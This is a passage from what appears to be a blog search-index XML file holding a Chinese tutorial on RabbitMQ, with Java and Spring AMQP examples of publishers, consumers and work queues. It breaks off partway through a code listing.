<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RabbitMQ</title>
      <link href="/bufferfly/blog/50a2b841.html"/>
      <url>/bufferfly/blog/50a2b841.html</url>
      
        <content type="html"><![CDATA[<p><a name="BB9gb"></a></p><h1 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h1><p><a name="XmLxR"></a></p><h1 id="1-初识MQ"><a href="#1-初识MQ" class="headerlink" title="1.初识MQ"></a>1.初识MQ</h1><p><a name="yOnLQ"></a></p><h2 id="1-1-同步和异步通讯"><a href="#1-1-同步和异步通讯" class="headerlink" title="1.1.同步和异步通讯"></a>1.1.同步和异步通讯</h2><p>微服务间通讯有同步和异步两种方式：<br />同步通讯：就像打电话，需要实时响应。<br />异步通讯：就像发邮件，不需要马上回复。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786612-bfe09fbc-30b0-4ba5-910b-97900e8beb5b.png#averageHue=%23578994&crop=0&crop=0&crop=1&crop=1&id=YHjCb&originHeight=605&originWidth=1495&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />两种方式各有优劣，打电话可以立即得到响应，但是你却不能跟多个人同时通话。发送邮件可以同时与多个人收发邮件，但是往往响应会有延迟。<br><a name="jd0te"></a></p><h3 id="1-1-1-同步通讯"><a href="#1-1-1-同步通讯" class="headerlink" title="1.1.1.同步通讯"></a>1.1.1.同步通讯</h3><p>之前学的Feign调用就属于同步方式，虽然调用可以实时得到结果，但存在下面的问题：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786722-2f92b8d1-d782-4fcb-84d7-9fb639ee530a.png#averageHue=%23faf7f7&crop=0&crop=0&crop=1&crop=1&id=CFRUo&originHeight=678&originWidth=1556&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />总结：<br />同步调用的优点：</p><ul><li>时效性较强，可以立即得到结果</li></ul><p>同步调用的问题：</p><ul><li><p>耦合度高</p></li><li><p>性能和吞吐能力下降</p></li><li><p>有额外的资源消耗</p></li><li><p>有级联失败问题<br><a name="deD2y"></a></p><h3 id="1-1-2-异步通讯"><a href="#1-1-2-异步通讯" class="headerlink" title="1.1.2.异步通讯"></a>1.1.2.异步通讯</h3><p>异步调用则可以避免上述问题：<br />我们以购买商品为例，用户支付后需要调用订单服务完成订单状态修改，调用物流服务，从仓库分配响应的库存并准备发货。<br />在事件模式中，支付服务是事件发布者（publisher），在支付完成后只需要发布一个支付成功的事件（event），事件中带上订单id。<br />订单服务和物流服务是事件订阅者（Consumer），订阅支付成功的事件，监听到事件后完成自己业务即可。<br />为了解除事件发布者与订阅者之间的耦合，两者并不是直接通信，而是有一个中间人（Broker）。发布者发布事件到Broker，不关心谁来订阅事件。订阅者从Broker订阅事件，不关心谁发来的消息。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786818-ba19cdaf-61ca-42b6-a40b-4eb4fd29e8de.png#averageHue=%23e6d6cc&crop=0&crop=0&crop=1&crop=1&id=f2pma&originHeight=134&originWidth=744&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />Broker 是一个像数据总线一样的东西，所有的服务要接收数据和发送数据都发到这个总线上，这个总线就像协议一样，让服务间的通讯变得标准和可控。<br />好处：</p></li><li><p>吞吐量提升：无需等待订阅者处理完成，响应更快速</p></li><li><p>故障隔离：服务没有直接调用，不存在级联失败问题</p></li><li><p>调用间没有阻塞，不会造成无效的资源占用</p></li><li><p>耦合度极低，每个服务都可以灵活插拔，可替换</p></li><li><p>流量削峰：不管发布事件的流量波动多大，都由Broker接收，订阅者可以按照自己的速度去处理事件</p></li></ul><p>缺点：</p><ul><li>架构复杂了，业务没有明显的流程线，不好管理</li><li>需要依赖于Broker的可靠、安全、性能</li></ul><p>好在现在开源软件或云平台上 Broker 的软件是非常成熟的，比较常见的一种就是我们今天要学习的MQ技术。<br><a name="W2lsn"></a></p><h2 id="1-2-技术对比："><a href="#1-2-技术对比：" class="headerlink" title="1.2.技术对比："></a>1.2.技术对比：</h2><p>MQ，中文是消息队列（MessageQueue），字面来看就是存放消息的队列。也就是事件驱动架构中的Broker。<br />比较常见的MQ实现：</p><ul><li>ActiveMQ</li><li>RabbitMQ</li><li>RocketMQ</li><li>Kafka</li></ul><p>几种常见MQ的对比：</p><table><thead><tr><th></th><th><strong>RabbitMQ</strong></th><th><strong>ActiveMQ</strong></th><th><strong>RocketMQ</strong></th><th><strong>Kafka</strong></th></tr></thead><tbody><tr><td>公司/社区</td><td>Rabbit</td><td>Apache</td><td>阿里</td><td>Apache</td></tr><tr><td>开发语言</td><td>Erlang</td><td>Java</td><td>Java</td><td>Scala&amp;Java</td></tr><tr><td>协议支持</td><td>AMQP，XMPP，SMTP，STOMP</td><td>OpenWire,STOMP，REST,XMPP,AMQP</td><td>自定义协议</td><td>自定义协议</td></tr><tr><td>可用性</td><td>高</td><td>一般</td><td>高</td><td>高</td></tr><tr><td>单机吞吐量</td><td>一般</td><td>差</td><td>高</td><td>非常高</td></tr><tr><td>消息延迟</td><td>微秒级</td><td>毫秒级</td><td>毫秒级</td><td>毫秒以内</td></tr><tr><td>消息可靠性</td><td>高</td><td>一般</td><td>高</td><td>一般</td></tr></tbody></table><p>追求可用性：Kafka、 RocketMQ 、RabbitMQ<br />追求可靠性：RabbitMQ、RocketMQ<br />追求吞吐能力：RocketMQ、Kafka<br />追求消息低延迟：RabbitMQ、Kafka<br><a name="v1IoI"></a></p><h1 id="2-入门"><a href="#2-入门" class="headerlink" title="2.入门"></a>2.入门</h1><p><a name="bjPW9"></a></p><h2 id="2-1-安装RabbitMQ"><a href="#2-1-安装RabbitMQ" class="headerlink" title="2.1.安装RabbitMQ"></a>2.1.安装RabbitMQ</h2><p>安装RabbitMQ，参考课前资料：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786900-d1c5001a-d83f-4982-9a78-1c0961aba74a.png#averageHue=%23fbf9f7&crop=0&crop=0&crop=1&crop=1&id=QLlPG&originHeight=138&originWidth=318&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />MQ的基本结构：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786980-394cb4b6-1a99-45ee-850b-ae9b4ba24d42.png#averageHue=%23e8d7b3&crop=0&crop=0&crop=1&crop=1&id=Z7b9M&originHeight=610&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />RabbitMQ中的一些角色：</p><ul><li><p>publisher：生产者</p></li><li><p>consumer：消费者</p></li><li><p>exchange个：交换机，负责消息路由</p></li><li><p>queue：队列，存储消息</p></li><li><p>virtualHost：虚拟主机，隔离不同租户的exchange、queue、消息的隔离<br><a name="T1HjP"></a></p><h2 id="2-2-RabbitMQ消息模型"><a href="#2-2-RabbitMQ消息模型" class="headerlink" title="2.2.RabbitMQ消息模型"></a>2.2.RabbitMQ消息模型</h2><p>RabbitMQ官方提供了5个不同的Demo示例，对应了不同的消息模型：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787076-9308a9f3-2e8c-471a-87cd-766ff8f3b446.png#averageHue=%23f8f5f5&crop=0&crop=0&crop=1&crop=1&id=f2Tmk&originHeight=715&originWidth=1492&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="T4zLf"></a></p><h2 id="2-3-导入Demo工程"><a href="#2-3-导入Demo工程" class="headerlink" title="2.3.导入Demo工程"></a>2.3.导入Demo工程</h2><p>课前资料提供了一个Demo工程，mq-demo:<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787199-2013017b-c013-4ce5-b453-0c0a9e013841.png#averageHue=%23c7ad84&crop=0&crop=0&crop=1&crop=1&id=ldcHW&originHeight=112&originWidth=232&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />导入后可以看到结构如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787276-88d553b3-7a16-4531-af56-641a9f37ad2d.png#averageHue=%23eef3ed&crop=0&crop=0&crop=1&crop=1&id=cV4YR&originHeight=193&originWidth=446&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />包括三部分：</p></li><li><p>mq-demo：父工程，管理项目依赖</p></li><li><p>publisher：消息的发送者</p></li><li><p>consumer：消息的消费者<br><a name="Z2HZj"></a></p><h2 id="2-4-入门案例"><a href="#2-4-入门案例" class="headerlink" title="2.4.入门案例"></a>2.4.入门案例</h2><p>简单队列模式的模型图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787363-fed4f089-38aa-4236-8c22-9f304e67805b.png#averageHue=%23f6f3eb&crop=0&crop=0&crop=1&crop=1&id=J3t1L&originHeight=215&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />官方的HelloWorld是基于最基础的消息队列模型来实现的，只包括三个角色：</p></li><li><p>publisher：消息发布者，将消息发送到队列queue</p></li><li><p>queue：消息队列，负责接受并缓存消息</p></li><li><p>consumer：订阅队列，处理队列中的消息<br><a name="n0JyN"></a></p><h3 id="2-4-1-publisher实现"><a href="#2-4-1-publisher实现" class="headerlink" title="2.4.1.publisher实现"></a>2.4.1.publisher实现</h3><p>思路：</p></li><li><p>建立连接</p></li><li><p>创建Channel</p></li><li><p>声明队列</p></li><li><p>发送消息</p></li><li><p>关闭连接和channel</p></li></ul><p>代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.helloworld;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Channel;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Connection;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PublisherTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendMessage</span><span class="params">()</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        <span class="comment">// 1.建立连接</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">// 1.1.设置连接参数，分别是：主机名、端口号、vhost、用户名、密码</span></span><br><span class="line">        factory.setHost(<span class="string">&quot;192.168.150.101&quot;</span>);</span><br><span class="line">        factory.setPort(<span class="number">5672</span>);</span><br><span class="line">        factory.setVirtualHost(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        factory.setUsername(<span class="string">&quot;itcast&quot;</span>);</span><br><span class="line">        factory.setPassword(<span class="string">&quot;123321&quot;</span>);</span><br><span class="line">        <span class="comment">// 1.2.建立连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">// 2.创建通道Channel</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line">        <span class="comment">// 3.创建队列</span></span><br><span class="line">        String queueName = <span class="string">&quot;simple.queue&quot;</span>;</span><br><span class="line">        channel.queueDeclare(queueName, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 4.发送消息</span></span><br><span class="line">        String message = <span class="string">&quot;hello, rabbitmq!&quot;</span>;</span><br><span class="line">        channel.basicPublish(<span class="string">&quot;&quot;</span>, queueName, <span class="keyword">null</span>, message.getBytes());</span><br><span class="line">        System.out.println(<span class="string">&quot;发送消息成功：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">        <span class="comment">// 5.关闭通道和连接</span></span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="bEghi"></a></p><h3 id="2-4-2-consumer实现"><a href="#2-4-2-consumer实现" class="headerlink" title="2.4.2.consumer实现"></a>2.4.2.consumer实现</h3><p>代码思路：</p><ul><li>建立连接</li><li>创建Channel</li><li>声明队列</li><li>订阅消息</li></ul><p>代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.helloworld;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConsumerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        <span class="comment">// 1.建立连接</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">// 1.1.设置连接参数，分别是：主机名、端口号、vhost、用户名、密码</span></span><br><span class="line">        factory.setHost(<span class="string">&quot;192.168.150.101&quot;</span>);</span><br><span class="line">        factory.setPort(<span class="number">5672</span>);</span><br><span class="line">        factory.setVirtualHost(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        factory.setUsername(<span class="string">&quot;itcast&quot;</span>);</span><br><span class="line">        factory.setPassword(<span class="string">&quot;123321&quot;</span>);</span><br><span class="line">        <span class="comment">// 1.2.建立连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">// 2.创建通道Channel</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line">        <span class="comment">// 3.创建队列</span></span><br><span class="line">        String queueName = <span class="string">&quot;simple.queue&quot;</span>;</span><br><span class="line">        channel.queueDeclare(queueName, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 4.订阅消息</span></span><br><span class="line">        channel.basicConsume(queueName, <span class="keyword">true</span>, <span class="keyword">new</span> DefaultConsumer(channel)&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       AMQP.BasicProperties properties, <span class="keyword">byte</span>[] body)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                <span class="comment">// 5.处理消息</span></span><br><span class="line">                String message = <span class="keyword">new</span> String(body);</span><br><span class="line">                System.out.println(<span class="string">&quot;接收到消息：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;等待接收消息。。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="qBU7O"></a></p><h2 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5.总结"></a>2.5.总结</h2><p>基本消息队列的消息发送流程：</p><ol><li>建立connection</li><li>创建channel</li><li>利用channel声明队列</li><li>利用channel向队列发送消息</li></ol><p>基本消息队列的消息接收流程：</p><ol><li>建立connection</li><li>创建channel</li><li>利用channel声明队列</li><li>定义consumer的消费行为handleDelivery()</li><li>利用channel将消费者与队列绑定<br><a name="VVz3G"></a><h1 id="3-SpringAMQP"><a href="#3-SpringAMQP" class="headerlink" title="3.SpringAMQP"></a>3.SpringAMQP</h1>SpringAMQP是基于RabbitMQ封装的一套模板，并且还利用SpringBoot对其实现了自动装配，使用起来非常方便。<br />SpringAmqp的官方地址：<a href="https://spring.io/projects/spring-amqp">https://spring.io/projects/spring-amqp</a><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787451-72dee171-3ecd-46e2-b098-a05b68db0ca6.png#averageHue=%23eeeeee&crop=0&crop=0&crop=1&crop=1&id=DXBQE&originHeight=499&originWidth=797&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787527-cb46096b-aab7-4885-beb4-994fb00c84c6.png#averageHue=%23ededed&crop=0&crop=0&crop=1&crop=1&id=hBf4u&originHeight=453&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />SpringAMQP提供了三个功能：</li></ol><ul><li><p>自动声明队列、交换机及其绑定关系</p></li><li><p>基于注解的监听器模式，异步接收消息</p></li><li><p>封装了RabbitTemplate工具，用于发送消息<br><a name="VPYnW"></a></p><h2 id="3-1-Basic-Queue-简单队列模型"><a href="#3-1-Basic-Queue-简单队列模型" class="headerlink" title="3.1.Basic Queue 简单队列模型"></a>3.1.Basic Queue 简单队列模型</h2><p>在父工程mq-demo中引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--AMQP依赖，包含RabbitMQ--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="QttGI"></a></p><h3 id="3-1-1-消息发送"><a href="#3-1-1-消息发送" class="headerlink" title="3.1.1.消息发送"></a>3.1.1.消息发送</h3><p>首先配置MQ地址，在publisher服务的application.yml中添加配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.101</span> <span class="comment"># 主机名</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span> <span class="comment"># 端口</span></span><br><span class="line">    <span class="attr">virtual-host:</span> <span class="string">/</span> <span class="comment"># 虚拟主机</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">itcast</span> <span class="comment"># 用户名</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123321</span> <span class="comment"># 密码</span></span><br></pre></td></tr></table></figure><p>然后在publisher服务中编写测试类SpringAmqpTest，并利用RabbitTemplate实现消息发送：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.spring;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringAmqpTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RabbitTemplate rabbitTemplate;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSimpleQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 队列名称</span></span><br><span class="line">        String queueName = <span class="string">&quot;simple.queue&quot;</span>;</span><br><span class="line">        <span class="comment">// 消息</span></span><br><span class="line">        String message = <span class="string">&quot;hello, spring amqp!&quot;</span>;</span><br><span class="line">        <span class="comment">// 发送消息</span></span><br><span class="line">        rabbitTemplate.convertAndSend(queueName, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="lqD7e"></a></p><h3 id="3-1-2-消息接收"><a href="#3-1-2-消息接收" class="headerlink" title="3.1.2.消息接收"></a>3.1.2.消息接收</h3><p>首先配置MQ地址，在consumer服务的application.yml中添加配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.101</span> <span class="comment"># 主机名</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span> <span class="comment"># 端口</span></span><br><span class="line">    <span class="attr">virtual-host:</span> <span class="string">/</span> <span class="comment"># 虚拟主机</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">itcast</span> <span class="comment"># 用户名</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123321</span> <span class="comment"># 密码</span></span><br></pre></td></tr></table></figure><p>然后在consumer服务的<code>cn.itcast.mq.listener</code>包中新建一个类SpringRabbitListener，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.listener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringRabbitListener</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenSimpleQueueMessage</span><span class="params">(String msg)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;spring 消费者接收到消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="bi81Z"></a></p><h3 id="3-1-3-测试"><a href="#3-1-3-测试" class="headerlink" title="3.1.3.测试"></a>3.1.3.测试</h3><p>启动consumer服务，然后在publisher服务中运行测试代码，发送MQ消息<br><a name="y2Ocd"></a></p><h2 id="3-2-WorkQueue"><a href="#3-2-WorkQueue" class="headerlink" title="3.2.WorkQueue"></a>3.2.WorkQueue</h2><p>Work queues，也被称为（Task queues），任务模型。简单来说就是<strong>让多个消费者绑定到一个队列，共同消费队列中的消息</strong>。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787605-9d2eff6e-6a64-413a-9509-7a5377fee1d2.png#averageHue=%23fdfafa&crop=0&crop=0&crop=1&crop=1&id=iSaeo&originHeight=471&originWidth=1253&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />当消息处理比较耗时的时候，可能生产消息的速度会远远大于消息的消费速度。长此以往，消息就会堆积越来越多，无法及时处理。<br />此时就可以使用work 模型，多个消费者共同处理消息处理，速度就能大大提高了。<br><a name="yJv4d"></a></p><h3 id="3-2-1-消息发送"><a href="#3-2-1-消息发送" class="headerlink" title="3.2.1.消息发送"></a>3.2.1.消息发送</h3><p>这次我们循环发送，模拟大量消息堆积现象。<br />在publisher服务中的SpringAmqpTest类中添加一个测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * workQueue</span></span><br><span class="line"><span class="comment">     * 向队列中不停发送消息，模拟消息堆积。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testWorkQueue</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="comment">// 队列名称</span></span><br><span class="line">    String queueName = <span class="string">&quot;simple.queue&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    String message = <span class="string">&quot;hello, message_&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 发送消息</span></span><br><span class="line">        rabbitTemplate.convertAndSend(queueName, message + i);</span><br><span class="line">        Thread.sleep(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="dcex7"></a></p><h3 id="3-2-2-消息接收"><a href="#3-2-2-消息接收" class="headerlink" title="3.2.2.消息接收"></a>3.2.2.消息接收</h3><p>要模拟多个消费者绑定同一个队列，我们在consumer服务的SpringRabbitListener中添加2个新的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenWorkQueue1</span><span class="params">(String msg)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者1接收到消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span> + LocalTime.now());</span><br><span class="line">    Thread.sleep(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RabbitListener(queues = &quot;simple.queue&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenWorkQueue2</span><span class="params">(String msg)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    System.err.println(<span class="string">&quot;消费者2........接收到消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span> + 